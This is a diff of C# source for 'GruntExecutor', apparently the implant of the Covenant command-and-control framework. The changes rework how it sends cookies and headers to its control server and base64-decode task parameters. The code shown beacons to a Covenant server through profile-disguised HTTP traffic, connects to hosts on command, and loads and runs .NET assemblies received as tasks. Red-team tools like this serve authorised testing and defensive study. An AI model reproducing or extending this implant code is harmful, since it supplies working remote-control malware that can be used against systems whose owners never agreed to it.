@@ -31,11 +31,9 @@ namespace GruntExecutor
                 // {{REPLACE_PROFILE_HTTP_HEADERS}}
 				List<string> ProfileHttpUrls = new List<string>();
                 // {{REPLACE_PROFILE_HTTP_URLS}}
-				List<string> ProfileHttpCookies = new List<string>();
-				// {{REPLACE_PROFILE_HTTP_COOKIES}}
-				string ProfileHttpGetResponse = @"{{REPLACE_PROFILE_HTTP_GET_RESPONSE}}";
-				string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}";
-				string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}";
+				string ProfileHttpGetResponse = @"{{REPLACE_PROFILE_HTTP_GET_RESPONSE}}".Replace(Environment.NewLine, "\n");
+				string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
+				string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
                 bool ValidateCert = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
                 bool UseCertPinning = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");
 
@@ -75,7 +73,7 @@ namespace GruntExecutor
                 }
                 else
                 {
-                    baseMessenger = new HttpMessenger(CovenantURI, CovenantCertHash, UseCertPinning, ValidateCert, ProfileHttpHeaderNames, ProfileHttpHeaderValues, ProfileHttpUrls, ProfileHttpCookies);
+                    baseMessenger = new HttpMessenger(CovenantURI, CovenantCertHash, UseCertPinning, ValidateCert, ProfileHttpHeaderNames, ProfileHttpHeaderValues, ProfileHttpUrls);
                     baseMessenger.Read();
                 }
                 baseMessenger.Identifier = GUID;
@@ -222,7 +220,7 @@ namespace GruntExecutor
                     {
                         object[] parameters = null;
                         if (pieces.Length > 1) { parameters = new object[pieces.Length - 1]; }
-                        for (int i = 1; i < pieces.Length; i++) { parameters[i - 1] = pieces[i]; }
+                        for (int i = 1; i < pieces.Length; i++) { parameters[i - 1] = Encoding.UTF8.GetString(Convert.FromBase64String(pieces[i])); }
                         byte[] compressedBytes = Convert.FromBase64String(pieces[0]);
                         byte[] decompressedBytes = Utilities.Decompress(compressedBytes);
                         Assembly gruntTask = Assembly.Load(decompressedBytes);
@@ -233,8 +231,6 @@ namespace GruntExecutor
                 else if (message.Type == GruntTaskingType.Connect)
                 {
                     string[] split = message.Message.Split(',');
-                    Console.WriteLine("split: " + split.Length);
-                    Console.WriteLine(split[0] + " " + split[1]);
                     bool connected = messenger.Connect(split[0], split[1]);
                     output += connected ? "Connection to " + split[0] + ":" + split[1] + " succeeded!" :
                                           "Connection to " + split[0] + ":" + split[1] + " failed.";
@@ -571,7 +567,6 @@ namespace GruntExecutor
         public string Identifier { get; set; } = "";
         public string Authenticator { get; set; } = "";
 
-        private string CookieAuthKeyName { get; }
         private string CovenantURI { get; }
         private CookieWebClient CovenantClient { get; set; } = new CookieWebClient();
         private object _WebClientLock = new object();
@@ -587,15 +582,13 @@ namespace GruntExecutor
 
         private string ToReadValue { get; set; } = "";
 
-        public HttpMessenger(string CovenantURI, string CovenantCertHash, bool UseCertPinning, bool ValidateCert, List<string> ProfileHttpHeaderNames, List<string> ProfileHttpHeaderValues, List<string> ProfileHttpUrls, List<string> ProfileHttpCookies)
+        public HttpMessenger(string CovenantURI, string CovenantCertHash, bool UseCertPinning, bool ValidateCert, List<string> ProfileHttpHeaderNames, List<string> ProfileHttpHeaderValues, List<string> ProfileHttpUrls)
         {
             this.CovenantURI = CovenantURI;
             this.Hostname = CovenantURI.Split(':')[1].Split('/')[2];
             this.ProfileHttpHeaderNames = ProfileHttpHeaderNames;
             this.ProfileHttpHeaderValues = ProfileHttpHeaderValues;
             this.ProfileHttpUrls = ProfileHttpUrls;
-            this.ProfileHttpCookies = ProfileHttpCookies;
-            this.CookieAuthKeyName = this.ProfileHttpCookies[this.Random.Next(this.ProfileHttpCookies.Count)];
 
             this.CovenantClient.UseDefaultCredentials = true;
             this.CovenantClient.Proxy = WebRequest.DefaultWebProxy;
@@ -656,8 +649,11 @@ namespace GruntExecutor
             for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
             {
                 this.CovenantClient.Headers.Set(ProfileHttpHeaderNames[i], ProfileHttpHeaderValues[i]);
+                if (ProfileHttpHeaderNames[i] == "Cookies")
+                {
+                    this.CovenantClient.SetCookies(new Uri(this.CovenantURI), ProfileHttpHeaderValues[i].Replace(";", ","));
+                }
             }
-            this.CovenantClient.Add(new Cookie(this.CookieAuthKeyName, this.Authenticator, "/", this.Hostname));
         }
     }
 
@@ -708,14 +704,14 @@ namespace GruntExecutor
 
     public class CookieWebClient : WebClient
     {
-        public CookieContainer CookieContainer { get; private set; }
+        private CookieContainer CookieContainer { get; }
         public CookieWebClient()
         {
             this.CookieContainer = new CookieContainer();
         }
-        public void Add(Cookie cookie)
+        public void SetCookies(Uri uri, string cookies)
         {
-            this.CookieContainer.Add(cookie);
+            this.CookieContainer.SetCookies(uri, cookies);
         }
         protected override WebRequest GetWebRequest(Uri address)
         {
